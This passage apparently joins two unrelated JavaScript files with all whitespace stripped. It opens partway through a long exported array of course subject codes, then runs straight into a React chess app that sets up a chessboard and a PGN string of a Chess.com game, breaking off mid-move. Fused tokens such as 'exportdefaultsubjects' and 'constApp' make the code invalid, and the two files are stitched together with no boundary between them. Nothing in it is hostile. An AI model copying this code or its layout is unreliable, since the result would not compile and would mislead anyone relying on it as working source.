Y','LEGALST','MUSIC','UGBA','MCELLBI','SSEASN','XMBA','CELTIC','GWS','HISTART','MATH','POLSCI','ETHSTD','ESPM','COGSCI','LS','COMLIT','MECENG','LINGUIS','PUBPOL','PHILOS','EWMBA','MBA','FILM','CIVENG','PBHLTH','CHEM','SLAVIC','NEU','HEBREW','MATSCI','XINTEGB','ECON','EWMBA','PBHLTH','MBA','OPTOM','SLAVIC','CIVENG','GERMAN','RHETOR','AGRS','ENVDES','ENGLISH','MATH','KHMER','ITALIAN','ESPM','ITALIAN','ELENG','LDARCH','POLSCI','CYPLAN','CIVENG','NATAMST','CHEM','NATAMST','INTEGBI','CHMENG','GERMAN','GERMAN','JEWISH','PHYSICS','XGLOBAL','PHILOS','TIBETAN','ANTHRO','THEATER','COLWRIT','INFO','PHILOS','POLSCI','BIOENG','XMBA','EWMBA','HEBREW','MECENG','MATH','HEBREW','MBA','TIBETAN','POLSCI','COLWRIT','ECON','YIDDISH','POLSCI','THEATER','LATIN','GEOG','MCELLBI','DESINV','CYPLAN','COMLIT','INDENG','SOCWEL','MCELLBI','PBHLTH','UGIS','DEVENG','BANGLA','MUSIC','EDUCSPE','DUTCH','PBHLTH','CHEM','MECENG','GREEK','ENGIN','GMS','HISTORY','AFRICAM','HISTORY','SEMITIC','SOCWEL','HUM','PBHLTH','LATAMST','MELC','FRENCH','MCELLBI','PHYSICS','COMPSS','SSEASN','MATH','FRENCH','INDENG','HISTART','PHILOS','XHISTOR','ARCH','EWMBA','ENGIN','DUTCH','DEMOG','INDENG','ESPM','PUBPOL','SOCIOL','CIVENG','HISTORY','MUSIC','SLAVIC','PUBPOL','CHINESE','PBHLTH','EPS','FRENCH','MCELLBI','EDUC','INFO','PLANTBI','PHYSICS','HISTORY','SPANISH','GEOG','PUBAFF','COLWRIT','COLWRIT','PHILOS','ART','DUTCH','ENGLISH','CIVENG','ENGLISH','NUCENG','ESPM','NUSCTX','PHYSICS','ENGIN','ELENG','INDENG','MCELLBI','EWMBA','MUSIC','EECS','ARCH','FILM','HEBREW','DESINV','ENGIN','MEDIAST','STAT','AGRS','HISTORY','ENGIN','ENGLISH','NEU','LINGUIS','CHEM','LEGALST','EDUC','GLOBAL','LINGUIS','CHMENG','THEATER','ENERES','UGIS','MBA','GLOBAL','DATASCI','POLSCI','EGYPT','PERSIAN','JAPAN','AFRICAM','JOURN','MBA','CHEM','HISTORY','ANTHRO','POLSCI','MCELLBI','CHMENG','LDARCH','EDUC','EDUC','AFRICAM','HISTORY','MECENG','DEMOG','ENGIN','PLANTBI','PUBAFF','NUSCTX','LS','JEWISH','UGBA','HISTART','UGIS','EDUC','INDENG','PUBPOL','ARCH','ENGIN','AMERSTD','SOCWEL','SOCWEL','LINGUIS','CIVENG','INDENG','SLAVIC','CPH','CIVENG','SOCIOL','SPANISH','AFRICAM','COLWRIT','AFRICAM','AMERSTD','BIOENG','HISTORY','BIOENG','DEMOG','EDUC','EDUC','GREEK','JAPAN','BIOENG','COMLIT','MECENG','MECENG','MATSCI','AFRICAM','CHICANO','ETHSTD','UGBA','MECENG','POLSCI','SOCWEL','SOCIOL','AMERSTD','ECON','NUSCTX','ART','POLSCI','ENGIN','HISTART','MATH','PHILOS','CIVENG','GERMAN','KOREAN','AMERSTD','JEWISH','POLSCI','ENGIN','INTEGBI','AMERSTD','KOREAN','SLAVIC','UGIS','SOCIOL','ART','CHINESE','TURKISH','JOURN','LINGUIS','CHINESE','NUSCTX','SOCWEL','MATSCI','GERMAN','MUSIC','ARCH','LDARCH','PHILOS','POLSCI','COMPSCI','UGBA','CHICANO','NWMEDIA','UKRAINI','EDUC','EDUC','ENGLISH','GERMAN','INFO','HISTORY','LEGALST','MUSIC','SOCWEL','EPS','GPP','HISTORY','POLSCI','SLAVIC','TELUGU','GPP','ASTRON','JEWISH','ELENG','UGIS','CHEM','THEATER','GWS','SSEASN','MECENG','MUSIC','EDUC','DEMOG','INDENG','MATH','ETHSTD','ECON','ECON','NUSCTX','PBHLTH','POLECON','AFRICAM','MELC','UGIS','POLSCI','ANTHRO','JOURN','NUCENG','LDARCH','MBA','ESPM','ARABIC','OPTOM','GERMAN','PBHLTH','ESPM','ETHSTD','THEATER','CHMENG','CYPLAN','JOURN','MELC','ENGIN','ASTRON','EDUC','EWMBA','GEOG','COMLIT','CIVENG','ITALIAN','ECON','CHMENG','PHILOS','PSYCH','KHMER','PHYSICS','COLWRIT','ENVDES','CHEM','UGBA','MCELLBI','GERMAN','MELC','CHICANO','OPTOM','XMBA','PHYSED','GPP','EDUC','PERSIAN','PHILOS','PACS','MBA','POLSCI','PERSIAN','MATH','INDENG','ANTHRO','SOCIOL','INDENG','INDENG','NESTUD','MATH','MUSIC','INTEGBI','HEBREW','THEATER','ELENG','INDENG','GEOG','PSYCH','ENVDES','ECON','HISTORY','RHETOR','ANTHRO','NUSCTX','NUCENG','PBHLTH','MECENG','PERSIAN','POLSCI','LINGUIS','COGSCI','MATH','POLSCI','CIVENG','DANISH','LS','PSYCH','COLWRIT','MUSIC','COMPSCI','STAT','RHETOR','FRENCH','GERMAN','PSYCH','NATAMST','MBA','PUBAFF','PSYCH','PHYSICS','JOURN','SCANDIN','XMBA','MATSCI','ART','MBA','INFO','MECENG','NATAMST','PACS','SOCWEL','NEU','COLWRIT','EECS','ITALIAN','ARABIC','MESTU','PHDBA','MECENG','INFO','EWMBA','EWMBA','HISTORY','MATSCI','NATRES','PBHLTH','EWMBA','GERMAN','PUBPOL','MELC','COMPSCI','COGSCI','GLOBAL','EPS','PBHLTH','EWMBA','ARABIC','SEMITIC','UGBA','ESPM','GPP','CIVENG','PLANTBI','COMPSS','UGBA','FRENCH','BUDDSTD','FRENCH','PSYCH','SEASIAN','DESINV','MEDIAST','PBHLTH','PBHLTH','UGIS','BIOENG','AMERSTD','EDUC','SLAVIC','DEVENG','SSEASN','EPS','MATSCI','JAPAN','PBHLTH','GERMAN','AFRICAM','MUSIC','POLSCI','EDUC','DEMOG','EDUC','SOCWEL','ESPM','UGBA','XHISTOR','PHYSICS','CHINESE','CRITTH','PBHLTH','EDUC','PHILOS','HISTORY','ECON','MECENG','LEGALST','ESPM','MUSIC','CELTIC','ENVDES','GLOBAL','SPANISH','SPANISH','PHYSICS','ENVDES','POLSCI','POLSCI','MATH','PHDBA','INDENG','JAPAN','CHEM','XGWS','CIVENG','PHILOS','MBA','POLSCI','MECENG','BIOENG','LEGALST','MBA','POLSCI','MEDIAST','PHILOS','INDENG','POLSCI','NEU','MUSIC','PBHLTH','HISTORY','EDUC','PHYSICS','SOCWEL','UGIS','EDUCSPE','INFO','GLOBAL','SPANISH','UGBA','EDUC','HISTORY','PSYCH','SCANDIN','DEVP','ECON','CHEM','ANTHRO','VIETNMS','MILSCI','MFE','ETHSTD','MECENG','JOURN','RHETOR','ASIANST','MELC','PSYCH','AGRS','ISF','LEGALST','EWMBA','ARESEC','ENVDES','MUSIC','COMPSCI','ETHSTD','JOURN','MBA','AFRICAM','EDUC','FILM','HISTORY','HISTART','POLSCI','ESPM','ETHSTD','SASIAN','SEASIAN','CIVENG','COLWRIT','GERMAN','CHEM','HISTORY','RELIGST','SOCIOL','BUDDSTD','ETHSTD','GEOG','INFO','SSEASN','ENVDES','SOCIOL','INTEGBI','LEGALST','COMPSCI','ECON','HISTORY','NUSCTX','HISTART','INTEGBI','ART','HISTORY','GEOG','PERSIAN','VISSTD','FILM','UGIS','SOCWEL','THEATER','MUSIC','PORTUG','KOREAN','POLSCI','CYPLAN','CIVENG','CHMENG','HISTART','ECON','PHDBA','ENGLISH','MBA','HISTORY','SEASIAN','XESPM','INTEGBI','TAMIL','PBHLTH','ELENG','ETHSTD','CHICANO','JEWISH','PHILOS','PLANTBI','LS','PUNJABI','DEVP','POLSCI','SOCIOL','RUSSIAN','FRENCH','MBA','MELC','MBA','NUSCTX','THEATER','COMPSCI','ANTHRO','MECENG','PLANTBI','XGEOG','FRENCH','MEDIAST','RHETOR','MFE','COLWRIT','COMLIT','ENGLISH','EDUC','GERMAN','PBHLTH','PSYCH','SOCWEL','UGBA','PBHLTH','ENERES','MUSIC','ENVDES','CHINESE','PHILOS','ESPM','SPANISH','PLANTBI','RHETOR','EWMBA','MECENG','PHILOS','AFRICAM','EDUC','GLOBAL','PERSIAN','GEOG','EGYPT','NAVSCI','LINGUIS','MECENG','HISTART','GLOBAL','EDUC','CIVENG','GLOBAL','HISTART','LEGALST','MCELLBI','MESTU','NUCENG','THEATER','ITALIAN','FRENCH','CYPLAN','ENVECON','ESPM','LINGUIS','SLAVIC','AEROENG','INTEGBI','HISTORY','CHEM','POLSCI','POLSCI','EDUC','ELENG','RHETOR','SOCIOL','FRENCH','MECENG','MBA','PSYCH','SEASIAN','ELENG','UGIS','NWMEDIA','THEATER','COLWRIT','CHEM','ARCH','ITALIAN','PERSIAN','SEASIAN','SOCIOL','DEVP','THAI','MELC','CHICANO','DESINV','GERMAN','EDUCSPE','INDENG','PBHLTH','COMLIT','GERMAN','EDUC','EDUC','ENGLISH','LS','CLASSIC','PSYCH','ENGLISH','XMBA','MUSIC','XMBA','NUCENG','INFO','ENGIN','AFRICAM','LEGALST','RUSSIAN','COMLIT','SOCIOL','SPANISH','EWMBA','BIOENG','CHMENG','PLANTBI','ECON','MUSIC','MCELLBI','PORTUG','SPANISH','LS','ESPM','MECENG','NATAMST','EDUC','CIVENG','EWMBA','PHDBA','JEWISH','PHYSICS','UGBA','COMLIT','ECON','CYPLAN','CHEM','SCANDIN','ENGLISH','FRENCH','AFRICAM','HISTORY','PBHLTH','ENVDES','HISTART','INTEGBI','GWS','ENGIN','MCELLBI','SEASIAN','CLASSIC','JOURN','MELC','NUSCTX','POLSCI','STRELIG','FRENCH','LINGUIS','POLSCI','MECENG','ETHSTD','ENVDES','LS','EWMBA','PSYCH','SOCWEL','DEMOG','FRENCH','EWMBA','HISTORY','MATH','COLWRIT','ENGIN','DATA','ENGLISH','HISTORY','MELC','PSYCH','CHINESE','DESINV','MECENG','AGRS','ELENG','ENGLISH','HISTART','LS','HUM','MECENG','ASAMST','NUSCTX','NWMEDIA','SLAVIC','ENVECON','XASTRON','ENGIN','MECENG','SLAVIC','MCELLBI','MATH','SOCIOL','ASAMST','AFRICAM','CHEM','GERMAN','JOURN','PUBPOL','FILM','CYPLAN','NUCENG','PLANTBI','CELTIC','ITALIAN','ARCH','NATRES','SOCWEL','INFO','CHEM','COMPSCI','HISTORY','HISTORY','LDARCH','PHYSICS','LEGALST','CHEM','SLAVIC','HISTORY','ANTHRO','NUCENG','MUSIC','POLSCI','LINGUIS','MECENG','AGRS','EDUC','EDUC','EDUC','GWS','INTEGBI','INTEGBI','SCANDIN','OPTOM','NUCENG','AFRICAM','POLECON','INFO','LINGUIS','POLSCI','XMBA','EDUC','ENGLISH','COLWRIT','ISF','LINGUIS','AGRS','POLSCI','POLSCI','EDUC','EWMBA','LEGALST','EDUC','ENGLISH','MCELLBI','PHYSICS','MECENG','SOCIOL','EDUC','SOCWEL','PBHLTH','JOURN','LINGUIS','OPTOM','PBHLTH','DEMOG','INFO','UGBA','INDENG','HISTORY','ANTHRO','COMLIT','EPS','DESINV','HEBREW','ANTHRO','INTEGBI','HISTORY','MCELLBI','CIVENG','CYPLAN','INTEGBI','MCELLBI','NSE','RHETOR','EDUC','SOCIOL','HISTORY','XMBA','ENERES','GWS','MUSIC','EDUC','HISTART','HISTORY','HMEDSCI','CHEM','DEVP','MUSIC','NWMEDIA','PHILOS','JOURN','ANTHRO','UGIS','PERSIAN','SOCWEL','EWMBA','NUCENG','PHDBA','BIOENG','ARCH','ITALIAN','MUSIC','ARESEC','XSOCIOL','ESPM','MBA','AFRICAM','INDENG','PHILOS','PUBPOL','SOCIOL','CUNEIF','MONGOLN','NUCENG','PHYSICS','LINGUIS','SPANISH','VISSCI','PBHLTH','STRELIG','GEOG','MATH','UGBA','EDUC','RHETOR','CHEM','DEVENG','AFRICAM','AHMA','AFRICAM','GERMAN','GLOBAL','MATH','ENGIN','KOREAN','NEU','OPTOM','MATH','HISTART','GERMAN','PUBPOL','MUSIC','ESPM','PBHLTH','MATH','LDARCH','SCANDIN','MCELLBI','LDARCH','GLOBAL','HISTART','PHILOS','MATH','JAPAN','CYPLAN','COLWRIT','COLWRIT','CYPLAN','AFRICAM','EPS','EDUC','KOREAN','CHEM','ECON','GERMAN','EWMBA','IRANIAN','ARABIC','MELC','MECENG','MUSIC','LINGUIS','PHYSED','PLANTBI','PUNJABI','PLANTBI','RHETOR','BIOLOGY','STAT','PSYCH','RHETOR','SASIAN','CIVENG','PHYSICS','COMPSS','POLSCI','AFRICAM','CHMENG','RHETOR','SOCIOL','ENGIN','EDSTEM','OPTOM','CHEM','PSYCH','XGEOG','NUCENG','FRENCH','GLOBAL','CHICANO','POLSCI','VISSCI','INDENG','OPTOM','SCANDIN','FRENCH','POLSCI','EDUC','MCELLBI','EDUC','EDUC','ART','PHYSED','HISTART','MECENG','UGIS','NUSCTX','ELENG','EDUC','CHICANO','ANTHRO','ENGIN','THEATER','EDUC','UGBA','EDUC','SSEASN','PHYSICS','LDARCH','LINGUIS','POLSCI','PSYCH','DUTCH','SOCWEL','COMPSS','ARABIC','HISTORY','INDENG','YIDDISH','MUSIC','MATH','ARCH','EECS','ART','EDUC','SOCIOL','ARCH','LINGUIS','NUCENG','TAMIL','POLSCI','FILM','INFO','SASIAN','MCELLBI','EDUC','MATH','COMLIT','GLOBAL','INFO','AFRICAM','ARESEC','POLSCI','ENGIN','EDUC','UGBA','CHEM','ENGIN','AFRICAM','PUBPOL','COMPSCI','CHICANO','HISTORY','CHICANO','GWS','MILAFF','DATASCI','CHMENG','ESPM','JOURN','SOCIOL','PBHLTH','THEATER','PUBPOL','MUSIC','ENGIN','EDUC','MBA','ESPM','FILM','CYBER','LEGALST','COLWRIT','MECENG','GWS','ARCH','HISTORY','JOURN','MECENG','AFRICAM','COMLIT','HUM','PSYCH','ETHSTD','ART','RHETOR','SOCWEL','EWMBA','GEOG','DEVENG','DESINV','FRENCH','JOURN','PBHLTH','ENGLISH','PHYSICS','GEOG','MCELLBI','PUBPOL','CHEM','HISTORY','EWMBA','COMLIT','HEBREW','ENGLISH','INDENG','MUSIC','CIVENG','KOREAN','PLANTBI','MECENG','POLSCI','RHETOR','MELC','HISTORY','CIVENG','ELENG','EWMBA','PBHLTH','PBHLTH','ASTRON','ENGIN','GERMAN','LS','LDARCH','PBHLTH','CHINESE','TIBETAN','DESINV','ENVECON','EDUC','POLSCI','PLANTBI','SOCIOL','SOCIOL','GERMAN','EDSTEM','MEDIAST','HEBREW','LS','PSYCH','MUSIC','ESPM','ENVDES','MUSIC','PUBPOL','CHINESE','SLAVIC','CYPLAN','ANTHRO','HUNGARI','CHEM','POLSCI','UGIS','LEGALST','AEROSPC','PHYSICS','SSEASN','CHINESE','ECON','ENGLISH','EGYPT','OPTOM','GWS','SLAVIC','SEMITIC','FRENCH','CHEM','CHEM','LEGALST','MILSCI','IAS','SASIAN','MEDIAST','EWMBA','CYPLAN','NUSCTX','AFRICAM','EPS','PHYSICS','RHETOR','SOCIOL','ITALIAN','ARABIC','ART','COLWRIT','ESPM','CHMENG','COGSCI','EDUC','XINTEGB','COLWRIT','COLWRIT','BIOENG','MECENG','MCELLBI','POLSCI','EECS','PSYCH','CYPLAN','STAT','ART','MBA','INTEGBI','SCANDIN','GEOG','PHILOS','NUSCTX','THEATER','ESPM','MBA','LS','MATH','MATH','PLANTBI','SCMATHE','XMBA','EGYPT','CHEM','BIOPHY','HINDI','MATSCI','ETHSTD','NUCENG','ANTHRO','PBHLTH','ESPM','EWMBA','ART','NATRES','PHYSICS','SSEASN','ENGIN','NUCENG','EGYPT','ENGIN','ENGIN','MUSIC','COMPSCI','EDUC','THEATER','AGRS','COLWRIT','GLOBAL','COLWRIT','COMLIT','LDARCH','AHMA','ENGLISH','MBA','MBA','NATAMST','MATH','MECENG','SOCIOL','CHINESE','CIVENG','ENGLISH','DESINV','ETHSTD','HISTORY','PHYSICS','ECON','CYPLAN','LS','MELC','MELC','JOURN','MELC','AHMA','SEASIAN','SOCIOL','MCELLBI','AFRICAM','SSEASN','URDU','HISTART','PSYCH','GERMAN','MCELLBI','COLWRIT','MUSIC','EECS','EDUC','INDENG','PUBPOL','LEGALST','ELENG','HISTORY','ASAMST','ELENG','PBHLTH','PORTUG','FILM','MBA','HMEDSCI','MBA','HISTORY','VISSCI','MBA','GWS','HISTORY','FRENCH','ENGLISH','RELIGST','ANTHRO','PLANTBI','ASAMST','LINGUIS','MATSCI','CMPBIO','INTEGBI','CIVENG','PLANTBI','NUCENG','PLANTBI','UGIS','CHMENG','MELC','LS','ENVDES','ANTHRO','PHYSICS','GLOBAL','LINGUIS','COLWRIT','ANTHRO','COMPSCI','COLWRIT','FRENCH','EDUC','OPTOM','EWMBA','HISTORY','XMBA','ENERES','BIOENG','INTEGBI','CHEM','PSYCH','ESPM','BIOENG','ENGIN','ESPM','CIVENG','ANTHRO','PUBAFF','AGRS','MFE','JOURN','POLSCI','POLSCI','ANTHRO','MBA','INDENG','EDUC','ETHSTD','MCELLBI','COMLIT','EDUCSPE','INTEGBI','ART','EWMBA','EDUC','ENGIN','GLOBAL','LINGUIS','RHETOR','ENGLISH','FILIPN','PHYSICS','THEATER','ITALIAN','ECON','HISTORY','HISTART','MELC','MILAFF','POLSCI','PUNJABI','SOCIOL','SWEDISH','HUM','ECON','EDUC','EDUC','PHILOS','AFRICAM','ART','HISTORY','SSEASN','HISTART','TIBETAN','STAT','INTEGBI','SOCIOL','MECENG','EDUC','MELC','VISSCI','LGBT','SSEASN','PHYSICS','PLANTBI','GSPDP','LDARCH','HMEDSCI','SPANISH','COLWRIT','EECS','MUSIC','ETHSTD','ELENG','CHICANO','BOSCRSR','ECON','HISTART','ELENG','HISTORY','COMPSCI','ENVDES','FILM','MCELLBI','ETHSTD','MUSIC','AFRICAM','MATH','ECON','ESPM','HISTORY','INTEGBI','MECENG','INFO','NWMEDIA','CUNEIF','MECENG','CHEM','MUSIC','EDUC','MUSIC','SOCIOL','EWMBA','EDUC','ESPM','CHICANO','EDSTEM','INTEGBI','COMPSCI','PSYCH','LINGUIS','INTEGBI','LS','POLSCI','MBA','MUSIC','NAVSCI','ELENG','UGIS','ELENG','DESINV','MCELLBI','NUCENG','PERSIAN','DEMOG','CHMENG','ENERES','OPTOM','FILM','HISTORY','ASIANST','MECENG','PBHLTH','HISTART','JOURN','GWS','MUSIC','ESPM','EWMBA','EPS','HISTART','ARESEC','MCELLBI','UGBA','FRENCH','CELTIC','INDENG','SCMATHE','CHMENG','SOCWEL','EDUC','ECON','SPANISH','HISTORY','MILAFF','PBHLTH','SPANISH','JOURN','MATSCI','MUSIC','RHETOR','SOCIOL','ETHSTD','EDUC','LEGALST','COLWRIT','ENGLISH','LINGUIS','CLASSIC','JOURN','FRENCH','MECENG','ENERES','DATA','MECENG','MUSIC','POLSCI','POLSCI','POLSCI','RUSSIAN','CYPLAN','NATAMST','RUSSIAN','UGBA','UGBA','ENGLISH','ARCH','GERMAN','HISTORY','MBA','POLSCI','CHMENG','SPANISH','ENVDES','EPS','INDENG','ARABIC','COLWRIT','VIETNMS','MCELLBI','COMPSCI','ESPM','COMPSCI','SCANDIN','EWMBA','PBHLTH','PLANTBI','EDUCSPE','MELC','PBHLTH','HISTART','COLWRIT','MECENG','JOURN','JOURN','EDUC','ARCH','ENGIN','HISTORY','UGIS','XMBA','MELC','ENVECON','NATAMST','PSYCH','UGBA','CHEM','BIOENG','HEBREW','SLAVIC','MCELLBI','MEDIAST','MELC','INTEGBI','SOCIOL','PUBAFF','UGBA','HISTART','COMLIT','CYBER','DEVSTD','PBHLTH','JAPAN','GWS','UGIS','XMBA','INDENG','STAT','CHMENG','COLWRIT','FRENCH','THEATER','LS','EDUC','GERMAN','OPTOM','THEATER','MCELLBI','THEATER','MCELLBI','PHYSICS','VISSTD','COMLIT','LINGUIS','EDUC','AGRS','ECON','ENGLISH','MECENG','MATSCI','HISTORY','NUSCTX','SOCIOL','NATAMST','HISTORY','HEBREW','ENERES','MATH','ENGLISH','ASIANST','EDUC','GEOG','HUM','ANTHRO','ENGIN','MECENG','SLAVIC','HISTART','NATAMST','OPTOM','JAPAN','EGYPT','STAT','MECENG','CMPBIO','HEBREW','MELC','POLSCI','TIBETAN','CIVENG','EDUC','GERMAN','NATAMST','MATH','PBHLTH','INTEGBI','IAS','JOURN','ETHSTD','ENGIN','DUTCH','SOCWEL','PLANTBI','GERMAN','ENGIN','GLOBAL','MCELLBI','HISTART','PSYCH','EWMBA','MUSIC','MATH','PUBPOL','MEDST','POLSCI','COLWRIT','ENGLISH','EPS','EDUC','ASTRON','EWMBA','FRENCH','FILM','MECENG','AMERSTD','ENVDES','SEASIAN','BIOENG','GWS','MBA','CHINESE','PHYSED','RUSSIAN','ASAMST','PUBAFF','MELC','CHINESE','RUSSIAN','SLAVIC','NUSCTX','GLOBAL','POLSCI','POLSCI','CHEM','PSYCH','PHILOS','SEASIAN','XMATH','XTHEATR','PHILOS','JEWISH','MBA','ECON','GEOG','XFILM','ARCH','SOCWEL','ART','EWMBA','EALANG','DANISH','MBA','MECENG','MFE','POLSCI','GWS','PBHLTH','MATSCI','ART','POLECON','ANTHRO','ENGLISH','CIVENG','CIVENG','BUDDSTD','MCELLBI','SOCIOL','BIOENG','LINGUIS','MCELLBI','ESPM','EDUC','INTEGBI','EDUC','EDUC','SLAVIC','MBA','POLSCI','GERMAN','COMPSCI','ENGLISH','DIGHUM','ITALIAN','GLOBAL','HMEDSCI','MCELLBI','MCELLBI','PORTUG','COMPSCI','GWS','PBHLTH','STAT','INFO','KOREAN','MATH','MCELLBI','JEWISH','NATAMST','HISTORY','GEOG','SLAVIC','ART','YIDDISH','DUTCH','ASAMST','ELENG','ENGLISH','CHICANO','THEATER','PSYCH','HUM','EWMBA','INDENG','FRENCH','COMLIT','DUTCH','PSYCH','MBA','PSYCH','UGBA','PSYCH','LEGALST','ARCH','PSYCH','PBHLTH','STAT','GERMAN','ELENG','HISTART','ANTHRO','INTEGBI','JAPAN','MATSCI','MECENG','ARCH','NWMEDIA','PBHLTH','EWMBA','HMEDSCI','ART','ETHSTD','INTEGBI','STAT','HISTORY','FRENCH','GEOG','COMPSCI','EALANG','THEATER','PHYSICS','EPS','MECENG','PUBPOL','EDUC','INDENG','ENVECON','RHETOR','UGBA','VISSTD','ENGLISH','RDEV','MATH','HISTORY','PHILOS','AGRS','ELENG','SCANDIN','CHEM','ESPM','ITALIAN','ENGIN','RHETOR','MUSIC','SPANISH','AFRICAM','LINGUIS','MEDIAST','SLAVIC','MELC','HISTART','EDUC','ITALIAN','EWMBA','PBHLTH','GERMAN','OPTOM','POLSCI','JEWISH','PHYSICS','ANTHRO','POLECON','SOCIOL','DEVP','DEVENG','EDUC','HISTORY','CYBER','EDUC','INTEGBI','PUBPOL','UGBA','CELTIC','HISTORY','PUBPOL','PBHLTH','MILSCI','AEROENG','AFRICAM','HISTART','POLSCI','EPS','ENGIN','PBHLTH','INTEGBI','EDUC','INFO','PSYCH','ENGIN','ARABIC','THEATER','POLSCI','MBA','BANGLA','LATAMST','MEDIAST','ELENG','ECON','JOURN','EWMBA','NUSCTX','HISTART','MELC','PBHLTH','HISTART','HMEDSCI','INDENG','HEBREW','COLWRIT','POLECON','POLSCI','STAT','POLSCI','OPTOM','JAPAN','UGBA','ASIANST','DEVP','GWS','ETHSTD','MATH','MCELLBI','NUCENG','POLSCI','EDUCSPE','EDUC','DEMOG','PBHLTH','GEOG','XMUSIC','ARCH','EPS','HISTORY','ARCH','LDARCH','MCELLBI','PHILOS','CIVENG','POLSCI','INDONES','COLWRIT','MATSCI','MBA','ANTHRO','STAT','AGRS','HISTART','SPANISH','SOCIOL','MUSIC','BIOENG','ELENG','HISTORY','XGEOG','GREEK','CIVENG','PLANTBI','FILM','XETHSTD','MATSCI','NEU','ENERES','EDUC','CHEM','ARCH','ARCH','PUBPOL','ENGIN','ANTHRO','BIOENG','POLSCI','INDENG','MFE','NEU','ARABIC','COLWRIT','DUTCH','THEATER','THEATER','PUBPOL','GWS','ARCH','JOURN','MECENG','CIVENG','COMPSCI','IAS','ECON','THEATER','ITALIAN','POLECON','SOCWEL','ARCH','CHEM','FILM','ITALIAN','NATAMST','COMLIT','EDUC','CHEM','PACS','THEATER','GEOG','EDUC','NEU','ECON','CYPLAN','VISSTD','EWMBA','PSYCH','BIOENG','LS','STAT','DEMOG','VISSCI','MATH','AMERSTD','POLISH','ENGIN','COMPSCI','ELENG','HISTORY','MECENG','MCELLBI','BURMESE','GEOG','HISTART','ECON','MBA','MECENG','MATH','ART','LDARCH','INDENG','LEGALST','SOCWEL','MECENG','SLAVIC','SCANDIN','ESPM','MCELLBI','PHDBA','POLSCI','INFO','MCELLBI','SPANISH','EWMBA','HISTORY','EALANG','CHEM','MCELLBI','MFE','XPSYCH','HISTORY','ESPM','ASTRON','HISTORY','MATH','MBA','RHETOR','GWS','HISTORY','DESINV','HISTORY','PLANTBI','THEATER','KOREAN','UGBA','PHILOS','FILM','FRENCH','PHILOS','ENGIN','ENGLISH','PSYCH','LINGUIS','PHILOS','LEGALST','NUSCTX','UGBA','SOCIOL','HISTART','RHETOR','GERMAN','HISTORY','EECS','SLAVIC','AFRICAM','EDUC','HISTORY','EDUC','SLAVIC','SLAVIC','POLSCI','HISTART','PSYCH','PSYCH','UGBA','BIOENG','ANTHRO','MCELLBI','COMLIT','CIVENG','EWMBA','INTEGBI','LATAMST','ARESEC','EWMBA','PHILOS','THEATER','HISTORY','MUSIC','NATAMST','PUBPOL','ANTHRO','CPH','OPTOM','HISTORY','HISTORY','LINGUIS','PORTUG','MECENG','PBHLTH','MCELLBI','GLOBAL','COLWRIT','CELTIC','ENERES','ELENG','DATA','ART','ASAMST','BIOENG','INDENG','MUSIC','NATAMST','LEGALST','MELC','PBHLTH','HISTORY','MELC','ANTHRO','CYPLAN','PBHLTH','POLSCI','LEGALST','KOREAN','CIVENG','SOCIOL','HISTART','SOCIOL','PHYSICS','SOCWEL','DEVENG','ESPM','EDUC','INTEGBI','THEATER','MEDIAST','LEGALST','PHDBA','FILM','PBHLTH','UGBA','SEASIAN','HISTORY','PBHLTH','CHEM','CHMENG','MELC','MUSIC','PERSIAN','BIOENG','CHICANO','PUBAFF','INFO','CHINESE','XMBA','UGBA','ECON','MELC','CIVENG','SOCIOL','VISSTD','ETHSTD','SOCIOL','MECENG','DUTCH','EDUC','ASTRON','MBA','MATH','LEGALST','MECENG','PERSIAN','SASIAN','CHICANO','AGRS','PBHLTH','CHEM','TAMIL','PSYCH','ECON','PLANTBI','GERMAN','CHINESE','FILM','EDUC','CHICANO','ARCH','GWS','HMEDSCI','MECENG','PERSIAN','PUBPOL','MELC','MELC','ENVECON','AMERSTD','CLASSIC','COMLIT','GREEK','MCELLBI','MCELLBI','ARCH','POLSCI','RHETOR','SCANDIN','XLINGUI','COLWRIT','STAT','MECENG','HISTORY','POLSCI','GEOG','ECON','ITALIAN','MONGOLN','PLANTBI','PSYCH','HISTART','TAMIL','ENGIN','UGIS','PHILOS','MBA','FRENCH','MBA','MFE','ASIANST','INTEGBI','AFRICAM','ANTHRO','FINNISH','PSYCH','SOCIOL','SOCIOL','PSYCH','RHETOR','MESTU','PLANTBI','RHETOR','MELC','PSYCH','DEVENG','SOCWEL','INTEGBI','MBA','COMPSCI','NEU','POLSCI','UGBA','ECON','RDEV','GERMAN','ARCH','INDENG','EWMBA','AMERSTD','ARESEC','ANTHRO','ART','HEBREW','INTEGBI','MUSIC','HISTORY','NAVSCI','ENGIN','PHDBA','PHILOS','SPANISH','EDUC','MFE','CIVENG','ENVECON','UGBA','HISTART','CHEM','MBA','ECON','CHICANO','AGRS','NATAMST','MELC','FILIPN','ARCH','MELC','HISTART','IRANIAN','EWMBA','PORTUG','THEATER','COGSCI','PBHLTH','GERMAN','ESPM','INTEGBI','HISTORY','CYPLAN','LS','ARABIC','BANGLA','POLSCI','CELTIC','MATH','PHYSICS','KOREAN','HISTORY','UGBA','PORTUG','MCELLBI','HISTART','PORTUG','MEDIAST','SEASIAN','ECON','GERMAN','ECON','NEU','INDONES','HISTORY','SLAVIC','POLECON','SSEASN','CHINESE','INTEGBI','FRENCH','RHETOR','MBA','SOCWEL','DEMOG','ELENG','GREEK','EWMBA','VISSTD','CHEM','ELENG','CHINESE','ETHSTD','GLOBAL','MBA','KOREAN','EDUC','ITALIAN','NUCENG','PACS','RHETOR','POLSCI','EPS','POLSCI','GEOG','POLSCI','ENGLISH','HISTORY','HISTORY','MECENG','ENGLISH','GWS','MECENG','MILSCI','RDEV','CHICANO','RHETOR','STAT','MELC','PSYCH','SLAVIC','GERMAN','CIVENG','HISTORY','PUBPOL','NUSCTX','CHMENG','NUSCTX','POLSCI','ASAMST','MATH','PHILOS','SANSKR','ART','ECON','HISTORY','PHDBA','HISTORY','DUTCH','POLSCI','PHYSICS','OPTOM','MATH','FILM','MATSCI','PHILOS','POLSCI','THEATER','LINGUIS']exportdefaultsubjects;import{Chessboard}from'react-chessboard';import{Chess}from'chess.js';import{useState}from'react';import'./index.css';constApp=()=>{constpgn=`[Event"LiveChess"][Site"Chess.com"][Date"2023.04.14"][Round"-"][White"rajbedi"][Black"ShiBoGod"][Result"1-0"][WhiteElo"1394"][BlackElo"1398"][TimeControl"600"][EndTime"22:22:45PDT"][Termination"rajbediwonbyresignation"]1.e4c62.d4d53.e5Bf54.Bd3Bxd35.Qxd3e66.Qb3Qb67.Qxb6axb68.Nf3c59.Be3Nc610.dxc5bxc511.O-ONge712.c3Nf513.Na3Nxe314.fxe3c415.Nb5Rc816.Ng5f517.exf6gxf618.